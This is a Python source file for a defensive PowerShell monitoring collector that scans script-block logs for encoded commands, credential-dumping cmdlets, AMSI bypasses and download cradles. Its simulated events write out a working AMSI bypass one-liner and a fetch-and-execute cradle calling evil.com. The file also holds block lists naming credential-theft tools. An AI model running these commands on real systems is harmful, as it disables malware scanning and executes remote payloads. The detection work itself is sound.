"""
KAVACH PowerShell Collector.

Monitors PowerShell execution via Event ID 4104 (Script Block Logging).
Detects: encoded commands, obfuscated scripts, suspicious cmdlets, AMSI bypass attempts.
"""

from __future__ import annotations

import re
from typing import Any

from collectors.base import BaseCollector, TelemetryEvent
from core.constants import CollectorName, EventType, Severity
from core.logging import get_logger

logger = get_logger(__name__)

SUSPICIOUS_CMDLETS: frozenset[str] = frozenset({
    "invoke-expression", "iex", "invoke-command", "invoke-webrequest",
    "downloadstring", "downloadfile", "start-bitstransfer",
    "invoke-mimikatz", "invoke-shellcode", "invoke-reflectivepeinjection",
    "new-object net.webclient", "system.net.webclient",
    "set-mppreference", "add-mppreference",
    "bypass", "unrestricted", "amsiutils", "amsiinitfailed",
    "invoke-obfuscation", "out-encodedcommand",
    "convertto-securestring", "get-credential",
    "get-process lsass", "procdump", "comsvcs",
    "sekurlsa", "kerberos", "logonpasswords",
})

AMSI_BYPASS_PATTERNS: list[str] = [
    r"amsiutils",
    r"amsiinitfailed",
    r"amsi\.dll",
    r"AmsiScanBuffer",
    r"amsiContext",
    r"SetValue.*Disable",
    r"Reflection\.Assembly",
]


class PowerShellCollector(BaseCollector):
    """Monitors PowerShell script execution for malicious activity."""

    name = CollectorName.POWERSHELL
    description = "PowerShell script block logging with encoded command and AMSI bypass detection"

    async def _collect_real(self) -> list[TelemetryEvent]:
        """Read PowerShell script block events from Windows Event Log."""
        import win32evtlog

        events: list[TelemetryEvent] = []
        try:
            hand = win32evtlog.OpenEventLog(None, "Microsoft-Windows-PowerShell/Operational")
            flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
            read_count = 0
            max_read = 100

            while read_count < max_read:
                raw = win32evtlog.ReadEventLog(hand, flags, 0)
                if not raw:
                    break
                for ev in raw:
                    read_count += 1
                    if read_count > max_read:
                        break

                    event_id = ev.EventID & 0xFFFF
                    if event_id != 4104:
                        continue

                    strings = ev.StringInserts or []
                    script_block = strings[2] if len(strings) > 2 else ""

                    event = self._analyze_script(script_block, strings)
                    if event:
                        events.append(event)

            win32evtlog.CloseEventLog(hand)
        except Exception as exc:
            logger.error("powershell_collector_error", error=str(exc))

        return events

    def _analyze_script(
        self, script: str, strings: list[str]
    ) -> TelemetryEvent | None:
        """Analyze a PowerShell script block for suspicious patterns."""
        if not script or len(script) < 10:
            return None

        script_lower = script.lower()
        severity = Severity.INFO
        risk = 0.0
        tags: list[str] = []
        findings: list[str] = []

        # Check for suspicious cmdlets
        for cmdlet in SUSPICIOUS_CMDLETS:
            if cmdlet in script_lower:
                severity = Severity.HIGH
                risk = max(risk, 70.0)
                tags.append("suspicious_cmdlet")
                findings.append(f"Suspicious cmdlet: {cmdlet}")

        # Encoded command detection
        if re.search(r"-e(nc(odedcommand)?)\s+[A-Za-z0-9+/=]{20,}", script, re.I):
            severity = Severity.HIGH
            risk = max(risk, 75.0)
            tags.append("encoded_command")
            findings.append("Encoded PowerShell command detected")

        # AMSI bypass detection
        for pattern in AMSI_BYPASS_PATTERNS:
            if re.search(pattern, script, re.I):
                severity = Severity.CRITICAL
                risk = max(risk, 90.0)
                tags.append("amsi_bypass")
                findings.append(f"AMSI bypass pattern: {pattern}")

        # Obfuscation indicators
        if script.count("`") > 10 or script.count("$") > 20:
            tags.append("possible_obfuscation")
            risk = max(risk, 40.0)

        # Download cradle detection
        if any(dl in script_lower for dl in ["downloadstring", "downloadfile", "invoke-webrequest", "wget", "curl"]):
            severity = max(severity, Severity.HIGH, key=lambda s: s.weight)
            risk = max(risk, 70.0)
            tags.append("download_cradle")
            findings.append("Download cradle detected")

        if not tags:
            return None  # Skip benign scripts

        return self._create_event(
            EventType.POWERSHELL_EXECUTION,
            severity=severity.value,
            risk_score=risk,
            tags=tags,
            metadata={
                "script_block": script[:2000],  # Truncate for storage
                "script_length": len(script),
                "findings": findings,
                "path": strings[4] if len(strings) > 4 else "",
            },
        )

    async def _collect_simulated(self) -> list[TelemetryEvent]:
        """Simulate PowerShell events."""
        return [
            self._create_event(
                EventType.POWERSHELL_EXECUTION,
                severity=Severity.HIGH.value, risk_score=75.0,
                tags=["simulated", "encoded_command"],
                metadata={
                    "script_block": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
                    "script_length": 85,
                    "findings": ["Encoded PowerShell command detected"],
                },
            ),
            self._create_event(
                EventType.POWERSHELL_EXECUTION,
                severity=Severity.CRITICAL.value, risk_score=90.0,
                tags=["simulated", "amsi_bypass", "suspicious_cmdlet"],
                metadata={
                    "script_block": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
                    "script_length": 156,
                    "findings": ["AMSI bypass pattern: amsiInitFailed", "Suspicious cmdlet: amsiutils"],
                },
            ),
            self._create_event(
                EventType.POWERSHELL_EXECUTION,
                severity=Severity.HIGH.value, risk_score=70.0,
                tags=["simulated", "download_cradle"],
                metadata={
                    "script_block": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
                    "script_length": 78,
                    "findings": ["Download cradle detected", "Suspicious cmdlet: downloadstring"],
                },
            ),
        ]
